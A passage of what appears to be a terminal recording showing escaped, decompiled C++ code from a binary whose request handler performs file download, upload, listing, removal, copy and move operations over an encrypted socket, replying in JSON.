[106.06061, "o", "/ try from 0041b995 to 0041b999 has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value::Value(&local_448,\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b9a6 to 0041b9b9 has its CatchHandler @ 0041b9c8 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_448);\\\\\\\\n                    /* try { // try from 0041b9c1 to 0041b9c5 has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value::~Value(&local_448);\\\\\\\\n                    /* try { // try from 0041b9f9 to 0041b9fd has its CatchHandler @ 0041ba24 */\\\\\\\\n        bVar4 = WriteJson(this,&reply_3);\\\\\\\\n        bVar4 = !bVar4;\\\\\\\\n        if (!bVar4) {\\\\\\\\n          uStack_10af4 = 0;\\\\\\\\n        }\\\\\\\\n                    /* try { // try from 0041ba51 to 0041ba55 has its CatchHandler @ 0041c052 */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<c"]
[106.06081, "o", "har>,std::allocator<char>> *)&data);\\\\\\\\njoined_r0x0041bd68:\\\\\\\\n        if (!bVar4) goto LAB_0041bd6e;\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        if (ret_2 < 0) {\\\\\\\\n          std::allocator<char>::allocator();\\\\\\\\n                    /* try { // try from 0041ba91 to 0041ba95 has its CatchHandler @ 0041bab7 */\\\\\\\\n          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string\\\\\\\\n                    ((char *)&data_1,(allocator *)\\\\\\\\\\\\\\\"file not found\\\\\\\\\\\\\\\");\\\\\\\\n          std::allocator<char>::~allocator(&local_429);\\\\\\\\n                    /* try { // try from 0041baa9 to 0041bb73 has its CatchHandler @ 0041bd2f */\\\\\\\\n          uVar8 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();\\\\\\\\n          len_1 = htonl(uVar8);\\\\\\\\n          SecureSocket<ClientConnection>::WriteBlock\\\\\\\\n                    (&this->connection_,this->write_cipher,&len_1,4,60000);\\\\\\\\n          iVar7 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::siz"]
[106.061011, "o", "e();\\\\\\\\n          pvVar11 = (void *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::\\\\\\\\n                            c_str((basic_string<char,std::char_traits<char>,std::allocator<char>> *)\\\\\\\\n                                  &data_1);\\\\\\\\n          SecureSocket<ClientConnection>::WriteBlock\\\\\\\\n                    (&this->connection_,this->write_cipher,pvVar11,iVar7,60000);\\\\\\\\n          Json::Value::Value(&local_428,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041bb80 to 0041bb93 has its CatchHandler @ 0041bba2 */\\\\\\\\n          pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n          Json::Value::operator=(pVVar10,&local_428);\\\\\\\\n                    /* try { // try from 0041bb9b to 0041bb9f has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::~Value(&local_428);\\\\\\\\n                    /* try { // try from 0041bbd4 to 0041bbd8 has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::Value(&local_408,\\\\\\\\\\\\\\\"400\\"]
[106.061061, "o", "\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041bbe5 to 0041bbf8 has its CatchHandler @ 0041bc07 */\\\\\\\\n          pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n          Json::Value::operator=(pVVar10,&local_408);\\\\\\\\n                    /* try { // try from 0041bc00 to 0041bc04 has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::~Value(&local_408);\\\\\\\\n                    /* try { // try from 0041bc3b to 0041bc3f has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::Value(&local_3e8,(basic_string *)&data_1);\\\\\\\\n                    /* try { // try from 0041bc4c to 0041bc5f has its CatchHandler @ 0041bc6e */\\\\\\\\n          pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n          Json::Value::operator=(pVVar10,&local_3e8);\\\\\\\\n                    /* try { // try from 0041bc67 to 0041bc6b has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::~Value(&local_3e8);\\\\\\\\n                    /* try { // try from 0041"]
[106.06125, "o", "bca0 to 0041bca4 has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::Value(&local_3c8,\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041bcb1 to 0041bcc4 has its CatchHandler @ 0041bcd3 */\\\\\\\\n          pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n          Json::Value::operator=(pVVar10,&local_3c8);\\\\\\\\n                    /* try { // try from 0041bccc to 0041bcd0 has its CatchHandler @ 0041bd2f */\\\\\\\\n          Json::Value::~Value(&local_3c8);\\\\\\\\n                    /* try { // try from 0041bd04 to 0041bd08 has its CatchHandler @ 0041bd2f */\\\\\\\\n          bVar4 = WriteJson(this,&reply_3);\\\\\\\\n          if (bVar4) {\\\\\\\\n            uStack_10af4 = 0;\\\\\\\\n          }\\\\\\\\n                    /* try { // try from 0041bd5c to 0041bd7e has its CatchHandler @ 0041c052 */\\\\\\\\n          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                    ((basic_string<char,std::char_traits<char>,std::allocator<char"]
[106.061371, "o", ">> *)&data_1);\\\\\\\\n          goto joined_r0x0041bd68;\\\\\\\\n        }\\\\\\\\nLAB_0041bd6e:\\\\\\\\n        Json::Value::Value(&local_3a8,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041bd8b to 0041bd9e has its CatchHandler @ 0041bdad */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_3a8);\\\\\\\\n                    /* try { // try from 0041bda6 to 0041bdaa has its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::~Value(&local_3a8);\\\\\\\\n                    /* try { // try from 0041bddf to 0041bde3 has its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::Value(&local_388,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041bdf0 to 0041be03 has its CatchHandler @ 0041be12 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_388);\\\\\\\\n                    /* try { // try from 0041be0b to 0041be0f has "]
[106.06142, "o", "its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::~Value(&local_388);\\\\\\\\n                    /* try { // try from 0041be44 to 0041be48 has its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::Value(&local_368,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041be55 to 0041be68 has its CatchHandler @ 0041be77 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_368);\\\\\\\\n                    /* try { // try from 0041be70 to 0041be74 has its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::~Value(&local_368);\\\\\\\\n                    /* try { // try from 0041bea9 to 0041bead has its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::Value(&local_348,\\\\\\\\\\\\\\\"chunked\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041beba to 0041beda has its CatchHandler @ 0041bee9 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        pVVar10 = (Value *)Jso"]
[106.06161, "o", "n::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Transfer-Encoding\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_348);\\\\\\\\n                    /* try { // try from 0041bee2 to 0041bee6 has its CatchHandler @ 0041c052 */\\\\\\\\n        Json::Value::~Value(&local_348);\\\\\\\\n                    /* try { // try from 0041bf1b to 0041bf49 has its CatchHandler @ 0041c052 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Accept-Encoding\\\\\\\\\\\\\\\");\\\\\\\\n        cVar5 = Json::Value::isString(pVVar10);\\\\\\\\n        if (cVar5 != '\\\\\\\\\\\\\\\\0') {\\\\\\\\n          Json::Value::Value(&local_328,\\\\\\\\\\\\\\\"gzip\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041bf56 to 0041bf76 has its CatchHandler @ 0041bf85 */\\\\\\\\n          pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n          pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Content-Encoding\\\\\\\\\\\\\\\");\\\\\\\\n          Json"]
[106.061718, "o", "::Value::operator=(pVVar10,&local_328);\\\\\\\\n                    /* try { // try from 0041bf7e to 0041bf82 has its CatchHandler @ 0041c052 */\\\\\\\\n          Json::Value::~Value(&local_328);\\\\\\\\n        }\\\\\\\\n                    /* try { // try from 0041bfb9 to 0041bff8 has its CatchHandler @ 0041c052 */\\\\\\\\n        bVar4 = WriteJson(this,&reply_3);\\\\\\\\n        if (bVar4) {\\\\\\\\n          Json::Value::Value(&local_308,request);\\\\\\\\n          json_.comments_ = in_stack_fffffffffffef4f8;\\\\\\\\n          json_._0_16_ = in_stack_fffffffffffef4e8;\\\\\\\\n                    /* try { // try from 0041c013 to 0041c017 has its CatchHandler @ 0041c02f */\\\\\\\\n          uStack_10af4 = FileOpration::GetFileData\\\\\\\\n                                   (&fileopration_,json_,(uint)&local_308,(Param *)0x1000);\\\\\\\\n                    /* try { // try from 0041c028 to 0041c02c has its CatchHandler @ 0041c052 */\\\\\\\\n          Json::Value::~Value(&local_308);\\\\\\\\n        }\\\\\\\\n        else {\\\\\\\\n          uStack_10af4 = 0;\\\\\\\\n        }\\\\\\"]
[106.061845, "o", "\\n      }\\\\\\\\n                    /* try { // try from 0041c07f to 0041c0be has its CatchHandler @ 0041d2fa */\\\\\\\\n      Json::Value::~Value(&reply_3);\\\\\\\\n      goto LAB_0041d327;\\\\\\\\n    }\\\\\\\\n    bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"upload\\\\\\\\\\\\\\\");\\\\\\\\n    if (bVar4) {\\\\\\\\n      FileOpration::FileOpration(&fileopration__1);\\\\\\\\n      Json::Value::Value(&reply_4,nullValue);\\\\\\\\n                    /* try { // try from 0041c0cb to 0041c0cf has its CatchHandler @ 0041c290 */\\\\\\\\n      Json::Value::Value(&local_2e8,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c0dc to 0041c0ef has its CatchHandler @ 0041c0fe */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_4,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_2e8);\\\\\\\\n                    /* try { // try from 0041c0f7 to 0041c0fb has its CatchHandler @ 0041c290 */\\\\\\\\n      Json::Value::~Value(&local_2e8);\\\\\\\\n                    /* try { // try "]
[106.061991, "o", "from 0041c130 to 0041c134 has its CatchHandler @ 0041c290 */\\\\\\\\n      Json::Value::Value(&local_2c8,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c141 to 0041c154 has its CatchHandler @ 0041c163 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_4,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_2c8);\\\\\\\\n                    /* try { // try from 0041c15c to 0041c160 has its CatchHandler @ 0041c290 */\\\\\\\\n      Json::Value::~Value(&local_2c8);\\\\\\\\n                    /* try { // try from 0041c195 to 0041c199 has its CatchHandler @ 0041c290 */\\\\\\\\n      Json::Value::Value(&local_2a8,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c1a6 to 0041c1b9 has its CatchHandler @ 0041c1c8 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_4,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_2a8);\\\\\\\\n                    /* try { // try from 0041c1c1 to 0041c1c5 has its CatchHandler @ 0041c290 */\\\\\\\\n      Js"]
[106.062141, "o", "on::Value::~Value(&local_2a8);\\\\\\\\n                    /* try { // try from 0041c1fc to 0041c23b has its CatchHandler @ 0041c290 */\\\\\\\\n      bVar4 = WriteJson(this,&reply_4);\\\\\\\\n      if (bVar4) {\\\\\\\\n        Json::Value::Value((Value *)&local_288,request);\\\\\\\\n        uploadjson.comments_ = in_stack_fffffffffffef4f8;\\\\\\\\n        uploadjson._0_16_ = in_stack_fffffffffffef4e8;\\\\\\\\n                    /* try { // try from 0041c251 to 0041c255 has its CatchHandler @ 0041c26d */\\\\\\\\n        uStack_10af4 = FileOpration::NewUploadFile(&fileopration__1,uploadjson,&local_288);\\\\\\\\n                    /* try { // try from 0041c266 to 0041c26a has its CatchHandler @ 0041c290 */\\\\\\\\n        Json::Value::~Value((Value *)&local_288);\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        uStack_10af4 = false;\\\\\\\\n      }\\\\\\\\n                    /* try { // try from 0041c2bd to 0041c2fc has its CatchHandler @ 0041d2fa */\\\\\\\\n      Json::Value::~Value(&reply_4);\\\\\\\\n      goto LAB_0041d327;\\\\\\\\n    }\\\\\\\\n    bVar4 = std::operator==<cha"]
[106.062249, "o", "r,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"filelist\\\\\\\\\\\\\\\");\\\\\\\\n    if (bVar4) {\\\\\\\\n      FileOpration::FileOpration(&fileopration__2);\\\\\\\\n      Json::Value::Value(&reply_5,nullValue);\\\\\\\\n                    /* try { // try from 0041c309 to 0041c30d has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::Value(&local_268,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c31a to 0041c32d has its CatchHandler @ 0041c33c */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_5,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_268);\\\\\\\\n                    /* try { // try from 0041c335 to 0041c339 has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::~Value(&local_268);\\\\\\\\n                    /* try { // try from 0041c36e to 0041c372 has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::Value(&local_248,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c37f to 0041c392 has its CatchHandler @ 0041c3a1 */\\"]
[106.062357, "o", "\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_5,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_248);\\\\\\\\n                    /* try { // try from 0041c39a to 0041c39e has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::~Value(&local_248);\\\\\\\\n                    /* try { // try from 0041c3d3 to 0041c3d7 has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::Value(&local_228,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c3e4 to 0041c3f7 has its CatchHandler @ 0041c406 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_5,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_228);\\\\\\\\n                    /* try { // try from 0041c3ff to 0041c403 has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::~Value(&local_228);\\\\\\\\n                    /* try { // try from 0041c438 to 0041c43c has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::Value(&local_208,\\\\\\\\\\\\\\\"chunked\\\\\\\\\\\\\\\");\\\\\\\\n                    /*"]
[106.062441, "o", " try { // try from 0041c449 to 0041c469 has its CatchHandler @ 0041c478 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_5,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Transfer-Encoding\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_208);\\\\\\\\n                    /* try { // try from 0041c471 to 0041c475 has its CatchHandler @ 0041c5f1 */\\\\\\\\n      Json::Value::~Value(&local_208);\\\\\\\\n                    /* try { // try from 0041c4ac to 0041c4d2 has its CatchHandler @ 0041c5f1 */\\\\\\\\n      bVar4 = WriteJson(this,&reply_5);\\\\\\\\n      if (bVar4) {\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();\\\\\\\\n                    /* try { // try from 0041c4df to 0041c4ff has its CatchHandler @ 0041c5ce */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"File-Path\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::asString((Valu"]
[106.062472, "o", "e *)local_1e8);\\\\\\\\n                    /* try { // try from 0041c50e to 0041c512 has its CatchHandler @ 0041c521 */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&filepath_1,\\\\\\\\n                   (basic_string *)local_1e8);\\\\\\\\n                    /* try { // try from 0041c51a to 0041c51e has its CatchHandler @ 0041c5ce */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_1e8);\\\\\\\\n                    /* try { // try from 0041c567 to 0041c56b has its CatchHandler @ 0041c5ce */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(local_1d8)\\\\\\\\n        ;\\\\\\\\n                    /* try { // try from 0041c581 to 0041c585 has its CatchHandler @ 0041c59d */\\\\\\\\n        uStack_10af4 = FileOpration::Show"]
[106.062621, "o", "FileList(&fileopration__2,(string)local_1d8,&this->param_);\\\\\\\\n                    /* try { // try from 0041c596 to 0041c59a has its CatchHandler @ 0041c5ce */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_1d8);\\\\\\\\n                    /* try { // try from 0041c5c7 to 0041c5cb has its CatchHandler @ 0041c5f1 */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&filepath_1);\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        uStack_10af4 = false;\\\\\\\\n      }\\\\\\\\n                    /* try { // try from 0041c61e to 0041c65d has its CatchHandler @ 0041d2fa */\\\\\\\\n      Json::Value::~Value(&reply_5);\\\\\\\\n      goto LAB_0041d327;\\\\\\\\n    }\\\\\\\\n  }\\\\\\\\n  bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"remove\\"]
[106.062726, "o", "\\\\\\\\\\\\\");\\\\\\\\n  if (bVar4) {\\\\\\\\n    FileOpration::FileOpration(&fileopration__3);\\\\\\\\n    Json::Value::Value(&reply_6,nullValue);\\\\\\\\n                    /* try { // try from 0041c66a to 0041c66e has its CatchHandler @ 0041c8c4 */\\\\\\\\n    Json::Value::Value(&local_1c8,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c67b to 0041c68e has its CatchHandler @ 0041c69d */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](&reply_6,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator=(pVVar10,&local_1c8);\\\\\\\\n                    /* try { // try from 0041c696 to 0041c69a has its CatchHandler @ 0041c8c4 */\\\\\\\\n    Json::Value::~Value(&local_1c8);\\\\\\\\n                    /* try { // try from 0041c6cf to 0041c6d3 has its CatchHandler @ 0041c8c4 */\\\\\\\\n    Json::Value::Value(&local_1a8,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c6e0 to 0041c6f3 has its CatchHandler @ 0041c702 */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](&reply_6,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n"]
[106.062803, "o", "    Json::Value::operator=(pVVar10,&local_1a8);\\\\\\\\n                    /* try { // try from 0041c6fb to 0041c6ff has its CatchHandler @ 0041c8c4 */\\\\\\\\n    Json::Value::~Value(&local_1a8);\\\\\\\\n                    /* try { // try from 0041c734 to 0041c738 has its CatchHandler @ 0041c8c4 */\\\\\\\\n    Json::Value::Value(&local_188,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c745 to 0041c758 has its CatchHandler @ 0041c767 */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](&reply_6,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator=(pVVar10,&local_188);\\\\\\\\n                    /* try { // try from 0041c760 to 0041c764 has its CatchHandler @ 0041c8c4 */\\\\\\\\n    Json::Value::~Value(&local_188);\\\\\\\\n                    /* try { // try from 0041c79b to 0041c7c1 has its CatchHandler @ 0041c8c4 */\\\\\\\\n    bVar4 = WriteJson(this,&reply_6);\\\\\\\\n    if (bVar4) {\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();\\\\\\\\n                    /* try { // t"]
[106.062896, "o", "ry from 0041c7ce to 0041c7ee has its CatchHandler @ 0041c8a1 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"File-Path\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::asString((Value *)local_168);\\\\\\\\n                    /* try { // try from 0041c7fd to 0041c801 has its CatchHandler @ 0041c810 */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&filepath_2,\\\\\\\\n                 (basic_string *)local_168);\\\\\\\\n                    /* try { // try from 0041c809 to 0041c80d has its CatchHandler @ 0041c8a1 */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_168);\\\\\\\\n                    /* try { // try from 0041c841 to 0041c845 has its CatchHandler @ 0041c8a1 */\\\\\\\\n      std::ba"]
[106.062971, "o", "sic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(local_158);\\\\\\\\n                    /* try { // try from 0041c854 to 0041c858 has its CatchHandler @ 0041c870 */\\\\\\\\n      uStack_10af4 = FileOpration::RemoveFile(&fileopration__3,(string)local_158);\\\\\\\\n                    /* try { // try from 0041c869 to 0041c86d has its CatchHandler @ 0041c8a1 */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_158);\\\\\\\\n                    /* try { // try from 0041c89a to 0041c89e has its CatchHandler @ 0041c8c4 */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&filepath_2);\\\\\\\\n    }\\\\\\\\n    else {\\\\\\\\n      uStack_10af4 = false;\\\\\\\\n    }\\\\\\\\n                    /* try { // try from 0041c8f1 to 0041c960 has its CatchHandler @ 0041d"]
[106.063048, "o", "2fa */\\\\\\\\n    Json::Value::~Value(&reply_6);\\\\\\\\n  }\\\\\\\\n  else {\\\\\\\\n    bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"move\\\\\\\\\\\\\\\");\\\\\\\\n    if ((bVar4) ||\\\\\\\\n       (bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"copy\\\\\\\\\\\\\\\"),\\\\\\\\n       bVar4)) {\\\\\\\\n      bVar4 = true;\\\\\\\\n    }\\\\\\\\n    else {\\\\\\\\n      bVar4 = false;\\\\\\\\n    }\\\\\\\\n    if (bVar4) {\\\\\\\\n      FileOpration::FileOpration(&fileopration__4);\\\\\\\\n      Json::Value::Value(&reply_7,nullValue);\\\\\\\\n                    /* try { // try from 0041c96d to 0041c971 has its CatchHandler @ 0041cb19 */\\\\\\\\n      Json::Value::Value(&local_148,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c97e to 0041c991 has its CatchHandler @ 0041c9a0 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_7,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_148);\\\\\\\\n                    /* try { // try from 0041c999 to 0041c99"]
[106.063145, "o", "d has its CatchHandler @ 0041cb19 */\\\\\\\\n      Json::Value::~Value(&local_148);\\\\\\\\n                    /* try { // try from 0041c9d2 to 0041c9d6 has its CatchHandler @ 0041cb19 */\\\\\\\\n      Json::Value::Value(&local_128,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041c9e3 to 0041c9f6 has its CatchHandler @ 0041ca05 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_7,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_128);\\\\\\\\n                    /* try { // try from 0041c9fe to 0041ca02 has its CatchHandler @ 0041cb19 */\\\\\\\\n      Json::Value::~Value(&local_128);\\\\\\\\n                    /* try { // try from 0041ca37 to 0041ca3b has its CatchHandler @ 0041cb19 */\\\\\\\\n      Json::Value::Value(&local_108,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ca48 to 0041ca5b has its CatchHandler @ 0041ca6a */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_7,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local"]
[106.063245, "o", "_108);\\\\\\\\n                    /* try { // try from 0041ca63 to 0041ca67 has its CatchHandler @ 0041cb19 */\\\\\\\\n      Json::Value::~Value(&local_108);\\\\\\\\n                    /* try { // try from 0041ca9e to 0041cacb has its CatchHandler @ 0041cb19 */\\\\\\\\n      bVar4 = WriteJson(this,&reply_7);\\\\\\\\n      if (bVar4) {\\\\\\\\n        Json::Value::Value(&local_e8,request);\\\\\\\\n        cp_mv_json.comments_ = in_stack_fffffffffffef4f8;\\\\\\\\n        cp_mv_json._0_16_ = in_stack_fffffffffffef4e8;\\\\\\\\n                    /* try { // try from 0041cada to 0041cade has its CatchHandler @ 0041caf6 */\\\\\\\\n        uStack_10af4 = FileOpration::File2CopyOrMove(&fileopration__4,cp_mv_json);\\\\\\\\n                    /* try { // try from 0041caef to 0041caf3 has its CatchHandler @ 0041cb19 */\\\\\\\\n        Json::Value::~Value(&local_e8);\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        uStack_10af4 = false;\\\\\\\\n      }\\\\\\\\n                    /* try { // try from 0041cb46 to 0041cb79 has its CatchHandler @ 0041d2fa */\\\\\\\\n      Json::Value::~"]
